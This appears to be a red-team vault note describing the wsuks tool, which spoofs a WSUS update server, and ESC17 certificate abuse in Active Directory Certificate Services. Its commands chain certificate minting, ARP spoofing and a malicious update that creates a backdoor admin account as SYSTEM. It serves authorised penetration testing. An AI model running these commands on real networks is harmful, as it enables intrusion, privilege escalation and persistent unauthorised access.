# wsuks

**Tags:** #LateralMovement #WSUS #ADCS #ESC17 #MITM

Automates the **WSUS client attack**: impersonate an organisation's Windows Server Update Services host and serve a malicious "update" to a client, which the Windows Update agent executes as **SYSTEM**. Written by Digitrace, who also identified [[Services/Active Directory/ADCS|ESC17]].

Historically this attack only worked against WSUS deployments served over plain HTTP, because HTTPS gave clients a certificate they could verify. **ESC17 removes that defence**: a certificate template that allows an enrollee-supplied subject *and* carries a Server Authentication EKU will mint a legitimately-trusted TLS certificate for `wsus.corp.local` to any domain user. With that certificate in hand, the HTTPS deployment is no better protected than the HTTP one.

**Source:** https://github.com/NeffIsBack/wsuks
**Install:** `pipx install wsuks` (requires root at runtime — it ARP-spoofs and binds the WSUS port)

```bash
# 1. Mint the fraudulent server certificate via ESC17 (see the ADCS note)
certipy req -u '<user>@<domain>' -p '<pass>' -dc-ip <dc_ip> \
  -target <CA_host> -ca '<CA_Name>' -template '<VulnTemplate>' \
  -dns 'wsus.corp.local'

# 2. Identify the WSUS server if you don't already know it — it's in GPO / the client registry
#    HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate /v WUServer

# 3. Redirect the victim and serve the payload
sudo wsuks -t <victim_ip> --WSUS-Server <wsus_ip> --WSUS-Port 8531 \
  -e PsExec64.exe -c '/accepteula /s cmd.exe /c "net user pwned Passw0rd! /add"'
```

> [!warning] **Loud and disruptive.** wsuks ARP-spoofs the victim and impersonates a production update server; a mistake takes patching offline for the affected hosts and can black-hole traffic. Confirm the target scope in the RoE, run it against one named host rather than a subnet, and expect it to be caught by any competent NDR.

> [!note] **See also**
> Services this tool is used against in this vault: [[Services/Active Directory/ADCS|ADCS]] — ESC17 supplies the trusted TLS certificate that makes this work against an HTTPS-enabled WSUS.
> Related tooling: [[Tools/AD/Certipy|Certipy]] (mints the certificate), [[Tools/Lateral Movement/ntlmrelayx|ntlmrelayx]] (the alternative payoff — relay the client's WSUS authentication to LDAP instead of serving an update), [[Tools/Lateral Movement/mitm6|mitm6]] (a different on-path primitive for the same "become a trusted service" goal).

---

*Created: 2026-09-22*
*Updated: 2026-09-22*
*Model: claude-opus-5*
